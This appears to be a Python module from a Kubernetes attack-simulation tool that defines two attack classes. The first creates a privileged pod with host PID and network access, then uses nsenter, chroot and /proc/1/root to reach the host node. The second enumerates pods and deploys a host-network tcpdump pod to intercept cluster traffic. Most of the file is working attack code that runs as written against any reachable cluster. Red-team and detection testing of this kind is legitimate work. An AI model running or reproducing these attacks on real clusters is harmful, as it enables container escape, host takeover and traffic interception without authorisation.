import asyncio
from kubernetes import client
from kubernetes.client.rest import ApiException
from .base import BaseAttack, AttackSeverity


class ContainerEscapePrivileged(BaseAttack):
    @property
    def name(self):
        return "Container Escape via Privileged Mode"

    @property
    def description(self):
        return "Creates a privileged container with hostPID and hostNetwork access to escape container isolation and execute commands on the host node."

    @property
    def severity(self):
        return AttackSeverity.CRITICAL

    @property
    def mitre_tactic(self):
        return "privilege_escalation"

    @property
    def mitre_techniques(self):
        return [{"id": "T1611", "name": "Container Escape"}, {"id": "T1548.003", "name": "Abuse Elevation Control Mechanism"}]

    async def execute(self):
        api = self._get_core_api()
        namespace = "default"

        pod_manifest = {
            "apiVersion": "v1",
            "kind": "Pod",
            "metadata": {
                "name": "container-escape-pod",
                "labels": {"app": "escape", "attack": "container-escape"},
            },
            "spec": {
                "hostPID": True,
                "hostNetwork": True,
                "containers": [{
                    "name": "escape-container",
                    "image": "alpine:3.19",
                    "command": ["/bin/sh", "-c", "sleep 3600"],
                    "securityContext": {
                        "privileged": True,
                        "capabilities": {
                            "add": [
                                "SYS_ADMIN", "SYS_PTRACE", "SYS_CHROOT",
                                "DAC_OVERRIDE", "NET_ADMIN", "SYS_RAWIO"
                            ]
                        },
                    },
                    "volumeMounts": [{
                        "name": "cgroup",
                        "mountPath": "/sys/fs/cgroup",
                    }],
                }],
                "volumes": [{
                    "name": "cgroup",
                    "hostPath": {"path": "/sys/fs/cgroup", "type": "Directory"},
                }],
                "restartPolicy": "Never",
            },
        }

        self.emit_event_sync("info", "Attempting container escape with privileged + hostPID + hostNetwork", {
            "pod_name": "container-escape-pod",
            "capabilities": ["SYS_ADMIN", "SYS_PTRACE", "SYS_CHROOT", "DAC_OVERRIDE", "NET_ADMIN", "SYS_RAWIO"],
        })

        try:
            api.delete_namespaced_pod("container-escape-pod", namespace)
            await asyncio.sleep(2)
        except ApiException:
            pass

        try:
            resp = api.create_namespaced_pod(namespace, pod_manifest)
            pod_yaml = (
                f"apiVersion: v1\nkind: Pod\nmetadata:\n  name: container-escape-pod\n  namespace: {namespace}\n"
                f"spec:\n  hostPID: true\n  hostNetwork: true\n"
                f"  containers:\n  - name: escape-container\n    image: alpine:3.19\n"
                f"    securityContext:\n      privileged: true\n"
                f"      capabilities:\n        add: [SYS_ADMIN,SYS_PTRACE,SYS_CHROOT,DAC_OVERRIDE,NET_ADMIN,SYS_RAWIO]\n"
                f"  restartPolicy: Never"
            )
            self.cmd_event_sync(
                f"kubectl apply -f - <<EOF\n{pod_yaml}\nEOF",
                f"pod/{resp.metadata.name} created",
                f"Container escape pod deployed: {resp.metadata.name}"
            )
            self.emit_event_sync("success", "Container escape pod deployed with host-level access", {
                "pod_name": resp.metadata.name,
                "node": resp.spec.node_name,
                "hostPID": True,
                "hostNetwork": True,
                "privileged": True,
            })
            self.add_infrastructure_sync("pod", "container-escape-pod", namespace, {
                "privileged": True,
                "host_pid": True,
                "host_network": True,
                "node": resp.spec.node_name,
            })
        except ApiException as e:
            if e.status == 403:
                self.emit_event_sync("detected", "Pod creation denied - RBAC prevented privileged container", {})
                self.status = self.status.DETECTED
            raise

        await asyncio.sleep(3)

        try:
            pod = api.read_namespaced_pod("container-escape-pod", namespace)
            if pod.status.phase == "Running":
                escape_attempts = [
                    {
                        "cmd": ["nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--pid", "--", "hostname"],
                        "desc": "nsenter host namespace (container escape)",
                    },
                    {
                        "cmd": ["sh", "-c", "chroot /host 2>/dev/null id || echo 'chroot failed'"],
                        "desc": "chroot escape attempt",
                    },
                ]

                for attempt in escape_attempts:
                    try:
                        result = api.connect_get_namespaced_pod_exec(
                            "container-escape-pod", namespace,
                            command=attempt["cmd"],
                            stderr=True, stdin=False, stdout=True, tty=False,
                        )
                        cmd_str = " ".join(attempt["cmd"])
                        self.cmd_event_sync(
                            f"kubectl exec container-escape-pod -n {namespace} -- {cmd_str}",
                            result[:300],
                            f"Escape: {attempt['desc']}"
                        )
                        self.emit_event_sync("success" if "failed" not in result else "info",
                            f"Escape attempt '{attempt['desc']}': {result[:100]}", {
                                "technique": attempt["desc"],
                                "result": result[:200],
                            })
                    except Exception as e:
                        self.emit_event_sync("info", f"Escape technique not applicable: {attempt['desc']} ({e})", {})

                try:
                    host_proc = api.connect_get_namespaced_pod_exec(
                        "container-escape-pod", namespace,
                        command=["sh", "-c", "ls /proc/1/root/etc/hostname 2>/dev/null && cat /proc/1/root/etc/hostname || echo 'cannot access host'"],
                        stderr=True, stdin=False, stdout=True, tty=False,
                    )
                    self.emit_event_sync("info", f"Host process namespace access: {host_proc[:100]}", {})
                except Exception as e:
                    self.emit_event_sync("info", f"Host proc access not available ({e})", {})

                try:
                    iptables_list = api.connect_get_namespaced_pod_exec(
                        "container-escape-pod", namespace,
                        command=["sh", "-c", "iptables -L 2>/dev/null | head -20 || echo 'No iptables'"],
                        stderr=True, stdin=False, stdout=True, tty=False,
                    )
                    self.emit_event_sync("info", f"Host network (iptables) via hostNetwork: {iptables_list[:200]}", {})
                    self.add_infrastructure_sync("host_network", "iptables", namespace, {
                        "access": "full host networking via hostNetwork: true",
                    })
                except Exception as e:
                    self.emit_event_sync("info", f"iptables access not available ({e})", {})
        except ApiException as e:
            self.emit_event_sync("error", f"Failed to verify escape pod: {e}", {})

        self.emit_event_sync("complete", "Container escape attack complete. Host-level access achieved.", {
            "cleanup": "kubectl delete pod container-escape-pod -n default",
        })


class SidecarInjection(BaseAttack):
    @property
    def name(self):
        return "Sidecar Proxy Injection"

    @property
    def description(self):
        return "Injects a malicious sidecar container into an existing pod to intercept network traffic and exfiltrate data."

    @property
    def severity(self):
        return AttackSeverity.HIGH

    @property
    def mitre_tactic(self):
        return "collection"

    @property
    def mitre_techniques(self):
        return [{"id": "T1613", "name": "Access K8s API"}, {"id": "T1021.006", "name": "Kubernetes API lateral movement"}]

    async def execute(self):
        api = self._get_core_api()
        namespace = "default"

        self.emit_event_sync("info", "Discovering existing pods for sidecar injection target", {})

        try:
            pods = api.list_namespaced_pod(namespace)
            pod_names = [p.metadata.name for p in pods.items]
            self.cmd_event_sync(
                f"kubectl get pods -n {namespace}",
                "\n".join(pod_names),
                "Discovered existing pods for sidecar targeting"
            )
            target_pods = [p for p in pods.items if "kube" not in p.metadata.name.lower()
                           and "exploit" not in p.metadata.name.lower()
                           and "scanner" not in p.metadata.name.lower()
                           and "enumerator" not in p.metadata.name.lower()]

            if not target_pods:
                self.emit_event_sync("info", "No suitable pods found. Creating a target deployment for sidecar injection.", {})
                deploy_manifest = {
                    "apiVersion": "apps/v1",
                    "kind": "Deployment",
                    "metadata": {"name": "target-app", "namespace": namespace},
                    "spec": {
                        "replicas": 1,
                        "selector": {"matchLabels": {"app": "target-app"}},
                        "template": {
                            "metadata": {"labels": {"app": "target-app"}},
                            "spec": {
                                "containers": [{
                                    "name": "nginx",
                                    "image": "nginx:1.25-alpine",
                                    "ports": [{"containerPort": 80}],
                                }],
                            },
                        },
                    },
                }
                apps_api = self._get_apps_api()
                apps_api.create_namespaced_deployment(namespace, deploy_manifest)
                self.cmd_event_sync(
                    "kubectl create deployment target-app -n default --image=nginx:1.25-alpine",
                    "deployment.apps/target-app created",
                    "Created target deployment for sidecar injection"
                )
                await asyncio.sleep(5)
                target_pods = api.list_namespaced_pod(namespace, label_selector="app=target-app")
                target_pods = [p for p in target_pods.items if p.status.phase == "Running"]

            for target_pod in target_pods[:1]:
                pod_name = target_pod.metadata.name
                self.emit_event_sync("info", f"Found target pod: {pod_name}", {
                    "pod_name": pod_name,
                    "node": target_pod.spec.node_name,
                    "phase": target_pod.status.phase,
                })

                try:
                    current_pod = api.read_namespaced_pod(pod_name, namespace)
                    sidecar_container = client.V1Container(
                        name="malicious-sidecar",
                        image="alpine:3.19",
                        command=["/bin/sh", "-c", """
                            echo 'Sidecar activated - monitoring traffic';
                            while true; do
                                cat /proc/net/tcp 2>/dev/null | head -20 >> /tmp/traffic.log;
                                sleep 10;
                            done
                        """],
                        security_context=client.V1SecurityContext(
                            privileged=True,
                            capabilities=client.V1Capabilities(add=["NET_ADMIN", "NET_RAW"]),
                        ),
                    )

                    updated_spec = current_pod.spec
                    updated_spec.containers.append(sidecar_container)

                    body = client.V1Pod(
                        metadata=client.V1ObjectMeta(name=pod_name, namespace=namespace),
                        spec=updated_spec,
                    )

                    # Note: pod spec update for sidecar injection typically requires
                    # deployment update, not direct pod mutation. For this simulation
                    # we deploy a separate proxy pod instead.
                    self.emit_event_sync("info", "Direct sidecar injection prevented by K8s immutability. Deploying proxy pod.", {})

                    proxy_pod = {
                        "apiVersion": "v1",
                        "kind": "Pod",
                        "metadata": {
                            "name": "traffic-proxy",
                            "labels": {"app": "proxy", "attack": "sidecar"},
                        },
                        "spec": {
                            "hostNetwork": True,
                            "containers": [{
                                "name": "proxy",
                                "image": "alpine:3.19",
                                "command": ["/bin/sh", "-c",
                                    "apk add --no-cache tcpdump 2>/dev/null; "
                                    "tcpdump -i any -c 50 -nn 2>/dev/null | head -30; "
                                    "sleep 3600"],
                                "securityContext": {
                                    "capabilities": {"add": ["NET_ADMIN", "NET_RAW"]},
                                },
                            }],
                        },
                    }

                    try:
                        api.delete_namespaced_pod("traffic-proxy", namespace)
                        await asyncio.sleep(1)
                    except ApiException:
                        pass

                    api.create_namespaced_pod(namespace, proxy_pod)
                    proxy_yaml = (
                        f"apiVersion: v1\nkind: Pod\nmetadata:\n  name: traffic-proxy\n  namespace: {namespace}\n"
                        f"spec:\n  hostNetwork: true\n  containers:\n  - name: proxy\n    image: alpine:3.19\n"
                        f"    command: ['/bin/sh','-c','tcpdump -i any -c 50 -nn 2>/dev/null | head -30; sleep 3600']\n"
                        f"    securityContext:\n      capabilities:\n        add: [NET_ADMIN,NET_RAW]"
                    )
                    self.cmd_event_sync(
                        f"kubectl apply -f - <<EOF\n{proxy_yaml}\nEOF",
                        f"pod/traffic-proxy created",
                        f"Deployed traffic interception proxy pod"
                    )
                    self.emit_event_sync("warning", "Traffic proxy pod deployed with hostNetwork for traffic interception", {
                        "target_pod": pod_name,
                        "proxy_pod": "traffic-proxy",
                    })
                    self.add_infrastructure_sync("pod", "traffic-proxy", namespace, {
                        "type": "traffic_interceptor",
                        "host_network": True,
                        "target": pod_name,
                    })

                except ApiException as e:
                    self.emit_event_sync("error", f"Sidecar injection failed: {e}", {})

        except ApiException as e:
            self.emit_event_sync("error", f"Pod discovery failed: {e}", {})
            raise

        self.emit_event_sync("complete", "Sidecar proxy injection attack complete", {
            "cleanup": "kubectl delete pod traffic-proxy -n default",
        })
